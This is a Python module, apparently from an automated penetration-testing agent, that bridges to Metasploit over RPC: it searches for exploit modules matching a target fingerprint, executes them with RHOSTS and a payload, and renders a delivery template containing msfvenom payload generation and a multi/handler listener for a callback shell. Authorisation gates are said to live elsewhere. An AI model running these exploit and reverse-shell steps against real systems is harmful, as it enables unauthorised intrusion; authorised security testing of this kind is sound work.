"""The Metasploit bridge — one typed interface over the RPC transport
(python-patterns), exposing the two §2.3.2 operations as distinct calls:
find a fitting module, and run a custom delivery. Both are MECHANISMS: the
bridge never decides whether an offensive step is allowed — that gating lives
upstream in the TS tool path (red-lines + validated-only + human gate). The
bridge only acts when told to.
"""

from __future__ import annotations

from .records import CustomPayloadSpec, ExploitResult, ExploitTarget, ModuleMatch, PayloadMode
from .rpc import MsfRpc


def _fingerprint_query(target: ExploitTarget) -> str:
    return " ".join(str(p) for p in (target.product, target.version, target.service) if p)


class MsfBridge:
    def __init__(self, rpc: MsfRpc) -> None:
        self._rpc = rpc

    def find_module(self, target: ExploitTarget) -> ModuleMatch | None:
        """Metasploit-first: search for a maintained module fitting the
        target's shape. Returns the best match, or None if nothing fits."""
        query = _fingerprint_query(target)
        if not query:
            return None
        result = self._rpc.call("module.search", query)
        modules = result.get("modules", [])
        if not modules:
            return None
        best = modules[0]
        return ModuleMatch(
            fullname=best["fullname"],
            name=best.get("name", best["fullname"]),
            rank=best.get("rank", "normal"),
            fit=_rank_fit(best.get("rank", "normal")),
        )

    def run_module(self, module: ModuleMatch, target: ExploitTarget, payload: str) -> ExploitResult:
        """Run a chosen module. The caller (TS tool) is responsible for having
        passed the gates before calling this."""
        module_type, _, module_name = module.fullname.partition("/")
        options = {"RHOSTS": target.host, "PAYLOAD": payload}
        if target.port:
            options["RPORT"] = target.port
        result = self._rpc.call("module.execute", module_type, module_name, options)
        session_id = result.get("session_id")
        return ExploitResult(
            ok=True,
            mode=PayloadMode.METASPLOIT_MODULE,
            module=module.fullname,
            session_opened=session_id is not None,
            session_id=session_id,
            output=f"module.execute -> job {result.get('job_id')}, uuid {result.get('uuid')}",
        )

    def generate_custom_payload(
        self, target: ExploitTarget, *, lhost: str, lport: int, payload_type: str, transport: str
    ) -> CustomPayloadSpec:
        """Write a bespoke delivery when no module fits (§2.3.2). This produces
        the spec + generated delivery code; generating it is exploitation
        activity, so the caller logs it as an attempts row and retains the
        code as evidence before anything is delivered."""
        code = _render_delivery(payload_type, lhost, lport, transport, target)
        return CustomPayloadSpec(
            payload_type=payload_type,
            lhost=lhost,
            lport=lport,
            transport=transport,
            generated_code=code,
        )


_RANK_FIT = {"excellent": 0.95, "great": 0.85, "good": 0.75, "normal": 0.6, "average": 0.5, "low": 0.3}


def _rank_fit(rank: str) -> float:
    return _RANK_FIT.get(rank.lower(), 0.5)


def _render_delivery(payload_type: str, lhost: str, lport: int, transport: str, target: ExploitTarget) -> str:
    """A minimal, readable delivery template. Deliberately a scaffold, not a
    weaponized artifact — Pluto's restraint principle (prove the door opens,
    don't walk through it) applies; the reasoning core refines specifics per
    target. Retained verbatim as evidence."""
    return (
        f"# Custom delivery for {target.host}:{target.port or ''} "
        f"({target.mechanism or target.service or 'bespoke'})\n"
        f"# transport: {transport}\n"
        f"# 1) generate payload:\n"
        f"#    msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f raw -o payload.bin\n"
        f"# 2) deliver via {transport} to the target path\n"
        f"# 3) start listener:\n"
        f"#    msfconsole -q -x 'use exploit/multi/handler; "
        f"set PAYLOAD {payload_type}; set LHOST {lhost}; set LPORT {lport}; run'\n"
    )
